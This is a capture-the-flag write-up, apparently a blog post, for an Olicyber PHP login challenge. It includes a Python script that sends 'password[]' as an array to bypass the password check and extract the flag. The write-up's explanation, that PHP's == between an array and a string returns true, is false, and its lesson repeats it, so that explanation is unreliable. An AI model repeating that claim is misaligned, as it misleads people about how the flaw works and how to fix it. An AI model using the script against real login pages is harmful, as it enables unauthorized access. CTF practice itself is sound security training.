---
title: "C-Style Login — PHP Type Juggling Array Bypass"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "php", "type-juggling", "python"]
difficulty: "beginner"
summary: "PHP's loose comparison treats an array as truthy against any string. Sending password[] as an array in the POST body bypasses the string comparison and grants access."
---

## The Challenge

A PHP login page. The backend compares the submitted password with a stored hash or string using a loose `==` comparison.

## Approach

In PHP, if one side of `==` is an array and the other is a string, the comparison returns `true` — the array is coerced in a way that makes the check pass. Sending `password[]` instead of `password` in the POST body causes PHP to parse the value as an array, and the comparison returns true regardless of value.

## Solution

```python
import requests
site = "http://clogin.challs.olicyber.it/"
r = requests.post(site, data={"password[]":"sas"})
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace(" ","").replace("</div>",""), end="")
        break
```

`password[]` in the POST body is the HTTP idiom for PHP array parameters. PHP's `==` between an array and a string evaluates to `true`, bypassing the password check. The flag appears in a `<div>` tag in the response.

## What I Learned

PHP's loose type comparison rules (`==` vs `===`) are a common vulnerability class. Sending `param[]` in a form makes PHP receive an array at `$_POST['param']`. Any code using `== $expected_string` instead of `=== $expected_string` or `password_verify` is vulnerable to this one-character POST body modification.
